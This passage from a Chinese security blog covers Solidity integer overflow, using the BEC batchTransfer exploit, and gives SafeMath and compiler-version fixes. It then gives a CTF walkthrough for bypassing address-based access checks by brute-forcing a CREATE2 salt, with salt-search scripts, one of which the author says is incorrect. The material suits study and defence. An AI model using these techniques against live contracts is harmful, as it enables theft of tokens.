20282409603651670423947251286015</span><br><span class="line">uint112 最高为: 5192296858534827628530496329220095</span><br><span class="line">uint120 最高为: 1329227995784915872903805060280344575</span><br><span class="line">uint128 最高为: 340282366920938463463374605431768211455</span><br><span class="line">uint136 最高为: 87112285931760246646623899502532662132735</span><br><span class="line">uint144 最高为: 22300545198530623141535718272648361505980415</span><br><span class="line">uint152 最高为: 5708990570823839524233143877797980545530986495</span><br><span class="line">uint160 最高为: 1461501637330902918203684832716283019655932542975</span><br><span class="line">uint168 最高为: 374144419156711147060143317175368453031918731001855</span><br><span class="line">uint176 最高为: 95780971304118053647396689196894323976171195136475135</span><br><span class="line">uint184 最高为: 24519928653854221733733552434404946937899825954937634815</span><br><span class="line">uint192 最高为: 6277101735386680563835789423205666416102355444464034512895</span><br><span class="line">uint200 最高为: 1606938044258990275541962092341162602522202993782792835301375</span><br><span class="line">uint208 最高为: 411376139330301510538742295639337626245683966408394965837152255</span><br><span class="line">uint216 最高为: 105312291668557186697918027683670432318895095400549111254310977535</span><br><span class="line">uint224 最高为: 26959946667150639794667015087019630673637144422540572481103610249215</span><br><span class="line">uint232 最高为: 6901746346790563787434755862277025452451108972170386555162524223799295</span><br><span class="line">uint240 最高为: 1766847064778384329583297500542918515827483896875618958121606201292619775</span><br><span class="line">uint248 最高为: 452312848583266388373324160190187140051835877600158453279131187530910662655</span><br><span class="line">uint256 最高为: 115792089237316195423570985008687905853269984665640564039457584005913129639935</span><br></pre></td></tr></table></figure><h2 id="溢出复现"><a href="#溢出复现" class="headerlink" title="溢出复现"></a>溢出复现</h2><p>我们以加法溢出为例，对溢出原理进行深入理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &lt;=0.6.0;</span><br><span class="line">contract Test &#123;</span><br><span class="line">    function sub(uint a, uint b) public pure returns (uint) &#123;</span><br><span class="line">        uint c = a - b;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/1.png" alt></p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/2.png" alt></p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/3.png" alt></p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/4.png" alt></p><p>因此，我们知道，solidity的减法操作在EVM中是使用sub操作码进行的。go-ethereum中的sub源码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(z *Int)</span></span> Sub(x, y *Int) *Int &#123;</span><br><span class="line"><span class="keyword">var</span> carry <span class="type">uint64</span></span><br><span class="line">z[<span class="number">0</span>], carry = bits.Sub64(x[<span class="number">0</span>], y[<span class="number">0</span>], <span class="number">0</span>)</span><br><span class="line">z[<span class="number">1</span>], carry = bits.Sub64(x[<span class="number">1</span>], y[<span class="number">1</span>], carry)</span><br><span class="line">z[<span class="number">2</span>], carry = bits.Sub64(x[<span class="number">2</span>], y[<span class="number">2</span>], carry)</span><br><span class="line">z[<span class="number">3</span>], _ = bits.Sub64(x[<span class="number">3</span>], y[<span class="number">3</span>], carry)   <span class="comment">//借位信号返回值被忽略</span></span><br><span class="line"><span class="keyword">return</span> z</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Int [<span class="number">4</span>]<span class="type">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sub64</span><span class="params">(x, y, borrow <span class="type">uint64</span>)</span></span> (diff, borrowOut <span class="type">uint64</span>) &#123;</span><br><span class="line">diff = x - y - borrow</span><br><span class="line">borrowOut = ((^x &amp; y) | (^(x ^ y) &amp; diff)) &gt;&gt; <span class="number">63</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;<span class="comment">//我们需要注意的是，有两个返回值：一个是diff，一个是借位信号borrowOut</span></span><br></pre></td></tr></table></figure><p>这个Int实际上是由4个uint64串联而成的结构，而四个64位就是256位，所以我们可以把结果直接看成uint256，那么这个函数实现的就是两个uint256数的相减。关键：借位信号返回值被忽略</p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/减法.png" alt></p><h2 id="相关案例"><a href="#相关案例" class="headerlink" title="相关案例"></a>相关案例</h2><ul><li><p>2018年4月22日，黑客对BEC智能合约发起攻击，凭空取出：</p><ul><li>57,896,044,618,658,100,000,000,000,000,000,000,000,000,000,000,000,000,000,000.792003956564819968个BEC代币并在市场上进行抛售，BEC随即急剧贬值，价值几乎为0，该市场瞬间土崩瓦解。</li></ul></li><li><p>2018年4月25日，SMT项目方发现其交易存在异常，黑客利用其函数漏洞创造了：</p><ul><li>65,133,050,195,990,400,000,000,000,000,000,000,000,000,000,000,000,000,000,000+50,659,039,041,325,800,000,000,000,000,000,000,000,000,000,000,000,000,000,000的SMT币，火币Pro随即暂停了所有币种的充值提取业务。</li></ul></li><li><p>2018年12月27日，以太坊智能合约Fountain(FNT)出现整数溢出漏洞，黑客利用其函数漏洞创造了：</p><ul><li>2+115792089237316195423570985008687905853269984665640564039457584005913129639935的SMT币。历史的血泪教训，如今不该再次出现。让我们一起缅怀这些一夜归零的代币，吸取前人经验教训。</li></ul></li></ul><p>以BEC合约为例，合约地址为：<em>0xC5d105E63711398aF9bbff092d4B6769C82F793D</em>。</p><p>在 etherscan 上的地址为：<em><a href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code">https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code</a></em></p><p>存在溢出漏洞的合约代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) &#123;</span><br><span class="line">    uint cnt = _receivers.length;</span><br><span class="line">    uint256 amount = uint256(cnt) * _value; //溢出点，这里存在整数溢出</span><br><span class="line">    require(cnt &gt; 0 &amp;&amp; cnt &lt;= 20);</span><br><span class="line">    require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class="line"> </span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(amount);</span><br><span class="line">    for (uint i = 0; i &lt; cnt; i++) &#123;</span><br><span class="line">        balances[_receivers[i]] = balances[_receivers[i]].add(_value);</span><br><span class="line">        Transfer(msg.sender, _receivers[i], _value);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BEC.jpg" alt></p><p>黑客传入了一个极大的值（这里为2**255），通过乘法向上溢出，使得 amount（要转的总币数）溢出后变为一个很小的数字或者0（这里变成0），从而绕过 balances[msg.sender] &gt;= amount 的检查代码，使得巨大 _value 数额的恶意转账得以成功。</p><p>实际攻击的恶意转账记录：<em><a href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f">https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f</a></em></p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BEC_.jpg" alt></p><h2 id="溢出漏洞攻击案例"><a href="#溢出漏洞攻击案例" class="headerlink" title="溢出漏洞攻击案例"></a>溢出漏洞攻击案例</h2><h2 id="其他有问题的代码"><a href="#其他有问题的代码" class="headerlink" title="其他有问题的代码"></a>其他有问题的代码</h2><p>1</p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20221210213433458.png" alt="image-20221210213433458"></p><p>2</p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20221210213514729.png" alt="image-20221210213514729"></p><h2 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h2><ul><li>使用OpenZeppelin的SafeMath库。注意：库函数可能会使合约无法使用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line">library SafeMath &#123;</span><br><span class="line">  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    if (a == 0) &#123;</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line">  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &gt; 0); </span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line">  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line">  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a); </span><br><span class="line">    return c;</span><br><span class="line">  &#125; </span><br><span class="line">  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b != 0);</span><br><span class="line">    return a % b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>有效的上下文校验：使用require、revert、assert</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>最简单的方法是使用至少 0.8 版本的 Solidity 编译器。在 Solidity 0.8 中，编译器会自动检查上溢和下溢。不会溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    uint public a = 0;</span><br><span class="line">    function y() public&#123;   </span><br><span class="line">        a--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果就是想溢出呢？</p><p>可以这么做：使用unchecked，这样做的意思是让编译器不要检查（不检查模式）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    uint public a = 0;</span><br><span class="line">    function y() public&#123;   </span><br><span class="line">    unchecked&#123;</span><br><span class="line">    a--;</span><br><span class="line">    &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用代码审计工具：<a href="https://github.com/wangbar0133/Asuka。">https://github.com/wangbar0133/Asuka。</a></li></ul><p>这是使用纯python编写的solidity代码审计工具，不需要安装solc等其他环境，可一键安装。如图是BEC整数溢出漏洞检测出来的结果</p><p><img src="/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/5.png" alt></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong>for循环</strong></p><p>fori循环中，i 的类型将是 uint8，因为这是保持值 0 所需的最小类型。如果数组的元素超过 255 个，则循环不会终止。使用<code>uint i</code>（256 位）可以避免这个问题。</p><p>注意：EVM 不允许无限计算，因此循环将消耗所有气体，交易将终止，但仍需向矿工支付费用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt; arrayName.length; i++) &#123;</span><br><span class="line">uint ikun = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.模糊身份漏洞</title>
      <link href="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="模糊身份"><a href="#模糊身份" class="headerlink" title="模糊身份"></a>模糊身份</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>任务描述：触发sendFlag事件</p><p>业务逻辑图：</p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/流程图.jpg" alt></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>能够触发sendFlag事件的只有函数payforflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function payforflag() public&#123;</span><br><span class="line">        require(token.balance(msg.sender) &gt;= 10000000 *10 **18, &quot;Try again&quot;);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数需要我们的余额大于10000000ETH，也就是调用者msg.sender在token中拥有10000000ETH。因此我们需要调用share_my_vault方法，来进行转钱。（我们用来盗取的msg.sender是create2创建出来的合约）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function share_my_vault()external only_EOA only_family&#123;</span><br><span class="line">        token.transfer(msg.sender,token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是这个方法需要满足only_EOA和only_family两个修饰符的检验。</p><h3 id="only-EOA"><a href="#only-EOA" class="headerlink" title="only_EOA"></a>only_EOA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">modifier only_EOA&#123;</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">            &#125;</span><br><span class="line">        require(x == 0,&quot;Only EOA can do that&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个和delegatecall漏洞的onlyOwner的其中一个满足条件一样，不再次做阐述。反正就是需要另起一个合约在构造器中进行攻击</p><h3 id="only-family"><a href="#only-family" class="headerlink" title="only_family"></a>only_family</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">modifier only_family&#123;</span><br><span class="line">        require(is_my_family(msg.sender),</span><br><span class="line">        &quot;no no no,my family only&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这需要我们的is_my_family函数返回true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function is_my_family(address account) internal returns (bool) &#123;</span><br><span class="line">        bytes20 you = bytes20(account);</span><br><span class="line"></span><br><span class="line">        bytes20 code = maskcode;</span><br><span class="line">        bytes20 feature = appearance;</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (you &amp; code == feature) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            code &lt;&lt;= 4;</span><br><span class="line">            feature &lt;&lt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数需要我们使 you 跟 code 进行与运算，结果要等于 feature。每次 for 循环都会使 code 和 feature 的二进制值左移四位，也就是在十六进制中左移一位，而由于 code 和 feature 初始值都只有后四位有值，且在 for 循环中移位也是同步的，feature 为 ffff，也就意味着我们 的 you 中需要包含feature的四个数字值，跟 code 做与运算后就会得到 feature 本身。 但 you 是什么呢，起初我以为可以自己进行构造，you 是 msg.sender， 也就是我合约的地址，而合约地址一般是不可控的（一般的合约创建是create）。</p><p><strong>所以我使用了 create2 操作来得到我满足条件的合约地址。得到一个特殊的地址来通过is_my_family函数返回true，逃过检验（这个检验也就是这个项目用来判断你是不是这个金库的成员）</strong></p><blockquote><ul><li>计算appearance：<ul><li>bytes20(bytes32(“ZT”))的值为：<code>0x5a54000000000000000000000000000000000000000000000000000000000000</code>，共160位，然后换成十六进制的40位</li><li>bytes20(bytes32(“ZT”))&gt;&gt;144。这句话就是右移144位，然后换算成十六进制的40位如下：</li><li><code>0x0000000000000000000000000000000000005a54</code></li></ul></li><li>计算maskcode：<ul><li>bytes20(uint160(0xffff))</li><li><code>0x000000000000000000000000000000000000ffff</code></li></ul></li></ul></blockquote><p>appearance的后面是5a54，在for循环中不断向前移动一位，看看我们的地址是否包含5a54，如果包含了就通过检验。</p><p>因此我们的目标是：通过create2操作来获取一个地址，这个地址包含5a54</p><h3 id="create2创建合约"><a href="#create2创建合约" class="headerlink" title="create2创建合约"></a>create2创建合约</h3><p>通过create2的操作码来得到一个地址，这个地址将通过only_family修饰符的检验</p><h4 id="create2简介"><a href="#create2简介" class="headerlink" title="create2简介"></a>create2简介</h4><p>CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。</p><p>【<strong>CREATE2如何计算地址</strong>】</p><p>CREATE2 的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上</p><p>CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。基本计算原理格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = hash(“0xff”,msg.sender,salt,keccak256(bytecode))//hash是keccak256</span><br></pre></td></tr></table></figure><ul><li>0xff：一个常数，避免和 CREATE 冲突</li><li>msg.sender：创建者地址</li><li>salt：一个创建者给定的数值</li><li>keccak256(bytecode)：待部署合约的字节码（bytecode）的哈希值</li></ul><p>CREATE2 保证：如果创建者使用 CREATE2 和提供的 salt 部署给定的合约 bytecode，它将存储在 新地址中。并且一个salt只可以使用一次，再次使用相同的salt会报错</p><p><strong>【使用</strong>】</p><p>非内联汇编部署方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Contract x = new Contract&#123;salt:_salt,value:_value&#125;(params)</span><br></pre></td></tr></table></figure><ul><li>Contract：创建的合约名</li><li>x：合约对象（地址）</li><li>_salt：指定的盐</li><li>_value：如果构造函数是 payable，可以创建时转入_value 数量的 ETH（wei）</li><li>params：新合约构造函数的参数</li></ul><p>内联汇编部署方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>发送给新合约的wei数(msg.value).</li><li>跳过bytecode前面32个字节长度的数据</li><li>获取bytecode的长度</li><li>salt ，我们将它作为可控参数，可以在计算后再提供，是一个随机数nonce</li></ol><p>解释：bytecode的前32个字节存储的是这个bytecode的总长度，32个字节后面的数据才是bytecode真正的数据</p><h4 id="计算salt"><a href="#计算salt" class="headerlink" title="计算salt"></a>计算salt</h4><p>这个是张学长写的，根据create2中计算地址的原理写的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//使用python，引入web3库</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;0xff406187E1b3366B5da3539D99C4E88E42FC60De50&#x27;</span></span><br><span class="line"></span><br><span class="line">s3= <span class="string">&#x27;da647010355608442b3eab68e7dcc6d5b836f2628d2366ff8ae853413a643965&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    s = s1+salt+s3</span><br><span class="line">    hashed = Web3.sha3(hexstr=s)</span><br><span class="line">    hashed_str = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;5a54&#x27;</span> <span class="keyword">in</span> hashed_str[<span class="number">26</span>:]:</span><br><span class="line">        <span class="built_in">print</span>(salt,hashed_str)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(salt)</span><br><span class="line"><span class="comment"># 输出结果：</span></span><br><span class="line"><span class="comment"># salt:0000000000000000000000000000000000000000000000000000000000000314 # hashed_str:ed2bb3003f33323b6ab51649857345a545213f2cf30379035ce2d922d1bf1f9d</span></span><br></pre></td></tr></table></figure><p>为什么<code>hashed_str[26:]</code>这样子设计呢？原因：这个脚本返回的第二个字符串是一个六十四位的数据，我们只需要后面的四十位作为地址，又因为题目合约的限定需要从第三位开始满足拥有“5a54”，因此我们需要从第二十六位之后的三十八位中含有”5a54”</p><p>注意：我们create2生成的地址是hashed_str后面的40位。即<code>857345a545213f2cf30379035ce2d922d1bf1f9d</code>。原因：判断5a54的时候是从第二十六位开始的，地址只需要四十位。</p><p>下面是网络上的方法，运行之后结果不正确，错误的原因我也不清楚，放在这留案先，以后懂了再来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> eth = <span class="built_in">require</span>(<span class="string">&#x27;ethereumjs-util&#x27;</span>)</span><br><span class="line"><span class="comment">// 0xff+部署人的地址：是固定的</span></span><br><span class="line"><span class="keyword">var</span> string1 = <span class="string">&#x27;0xff406187E1b3366B5da3539D99C4E88E42FC60De50&#x27;</span></span><br><span class="line"><span class="comment">// 字节码的哈希是固定的。用eth.keccak256（）计算：</span></span><br><span class="line"><span class="keyword">var</span> string2 = <span class="string">&#x27;da647010355608442b3eab68e7dcc6d5b836f2628d2366ff8ae853413a643965&#x27;</span></span><br><span class="line"><span class="comment">//在每个循环中，i是我们正在检查的盐的值</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line">   <span class="comment">// 1. 将i转换为十六进制，并将其填充为32字节：</span></span><br><span class="line">   <span class="keyword">var</span> saltToBytes = i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">   <span class="comment">// 2. 将此连接到2个字符串之间</span></span><br><span class="line">   <span class="comment">//var concatString = string1 + saltToBytes + string2</span></span><br><span class="line">   <span class="keyword">var</span> concatString = string1.<span class="title function_">concat</span>(saltToBytes).<span class="title function_">concat</span>(string2)</span><br><span class="line">   <span class="keyword">var</span> bufferr = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(concatString)</span><br><span class="line">   <span class="comment">// 3. 对bufferr进行哈希</span></span><br><span class="line">   <span class="keyword">var</span> hashed = eth.<span class="title function_">bufferToHex</span>(eth.<span class="title function_">keccak256</span>(bufferr))</span><br><span class="line">   <span class="comment">// 4. 检查结果是否包含“5a54”</span></span><br><span class="line">   <span class="keyword">if</span> (hashed.<span class="title function_">substr</span>(<span class="number">26</span>).<span class="title function_">includes</span>(<span class="string">&#x27;5a54&#x27;</span>)) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(hashed)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(i.<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果：</span></span><br><span class="line"><span class="comment">//salt：0000000000000000000000000000000000000000000000000000000000000127</span></span><br><span class="line"><span class="comment">//hashed:0x09f835fd63f3bc07c59ac5fbe323428d65a54a9597c5560a4cf543f086123339</span></span><br></pre></td></tr></table></figure><h2 id="攻击合约代码"><a href="#攻击合约代码" 